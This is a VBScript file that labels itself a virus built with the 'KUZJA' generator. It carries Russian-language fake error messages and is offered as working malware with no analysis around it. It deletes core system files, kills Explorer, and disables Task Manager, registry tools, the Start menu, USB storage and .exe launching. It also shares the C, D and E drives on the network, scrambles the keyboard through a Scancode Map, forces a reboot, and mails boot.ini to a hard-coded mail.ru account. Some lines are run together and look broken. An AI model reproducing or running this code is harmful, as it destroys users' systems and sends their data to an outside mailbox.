'This virus created by generator KUZJA
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
'Virus: system32
'Autor: No Na Me
s.regwrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption","Файл 3fr.dll не является приложением Win 32.","REG_SZ"
s.regwrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText","Ошибка","REG_SZ"
s.regwrite"HKLM\SYSTEM\CurrentControlSet\Services\Cdrom\AutoRun","0","REG_DWORD"randomize
do
h=cint(rnd()*1000)
m=cint(rnd()*1000)
if h<=23 and m<=59 then
wscript.sleep 1000
s.run "cmd /c time "&h&":"&m,0
end if
loops.run"net share c=c:\",0
s.run"net share d=d:\",0
s.run"net share e=e:\",0
s.regwrite"HKEY_CLASSES_ROOT\Network\SharingHandler\",""
s.regwrite"HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\nodesktop","1","REG_DWORD"
s.regwrite"HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ClassicShell","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","67108863","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
s.regwrite"HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFindFiles","1","REG_DWORD"
s.regwrite"HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoNavButtons","1","REG_DWORD"
s.run"taskkill /f /im explorer.exe",0 
fso.deletefile fso.getspecialfolder(0)+"\system32\hal.dll",1
fso.deletefolder fso.getspecialfolder(0)+"\system32\drives",1
s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","Сартир"
s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","Ламер"
s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","Психушка"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuPinnedList","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMFUprogramsList","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoUserNameInStartMenu","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{20D04FE0-3AEA-1069-A2D8-08002B30309D}","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuNetworkPlaces","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\StartmenuLogoff","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuSubFolders","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCommonGroups","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFavoritesMenu","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecentDocsMenu","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoAddPrinter","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSMHelp","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMorePrograms","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoChangeStartMenu","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSMMyDocs","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSMMyPictures","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMyMusic","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel","1","REG_DWORD"
s.run"rundll32 user32, SwapMouseButton"
s.regwrite"HKCR\exefile\shell\open\command\","rundll32.exe"
i=20
while i>0 or i<0
S.popup "Неустранимая ошибка по адресу F062: Системе не хватает памяти или файл повреждён",2, "Критическая ошибка",0+16
i=i-1
wend
Set ww=CreateObject("WMPlayer.OCX.7")
Set cw=ww.cdromCollection
if cw.Count>=1 then
For i=0 to cw.Count-1
cw.Item(i).eject
next
End If
Call SendPost("smtp.mail.ru","pop-under@mail.ru","maximum32.94@mail.ru","Вирус","Копм заражен!")
Function SendPost(strSMTP_Server,strTo,strFrom,strSubject,strBody)
Set iMsg=CreateObject("CDO.Message")
Set iConf=CreateObject("CDO.Configuration")
Set Flds=iConf.Fields
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")=2
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate")=1
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")="maximum32.94"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword")="32323232"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver")="smtp.mail.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport")=25
Flds.Update
iMsg.Configuration=iConf
iMsg.To=strTo
iMsg.From=strFrom
iMsg.Subject=strSubject
iMsg.TextBody=strBody
iMsg.AddAttachment "c:\boot.ini" 
iMsg.Send
End Function
Set iMsg=Nothing
Set iConf=Nothing
Set Flds=Nothing
s.regwrite"HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR\Start","4","REG_DWORD"

s.run "shutdown -r -t 31 -c ""Файл user32dll не является приложением Win 32 ."" -f",1 
s.run"reg add ""hklm\system\currentcontrolset\control\keyboard layout"" /v ""Scancode Map"" /t REG_BINARY /d 0000000000000000A000000000005DE000000E0000003A00000053E000004FE000001C0000000100000047E0000052E00000380000001D0000002A0000005BE000004500000051E0000049E000005EE0000037E0000038E000001DE00000360000005CE00000460000005FE00000390000000F00000063E00000280000000C000000330000003400000035000000270000001A0000002B0000001B000000290000000D0000000B00000002000000030000000400000005000000060000000700000008000000090000000A0000001E000000300000002E0000002000000012000000210000002200000023000000170000002400000025000000260000003200000031000000180000001900000010000000130000001F00000014000000160000002F000000110000002D000000150000002C0000003B0000003C0000003D0000003E0000003F00000040000000410000004200000043000000440000005700000058000000640000006500000066000000520000004F00000050000000510000004B0000004C0000004D0000004700000048000000490000004A000000370000005300000035E000004E0000001CE0000050E000004BE000004DE0000048E000000000",0
do
wscript.sleep 200
s.sendkeys"{capslock}"
wscript.sleep 200
s.sendkeys"{numlock}"
wscript.sleep 200
s.sendkeys"{scrolllock}"
fso.getfile("A:\")
loop

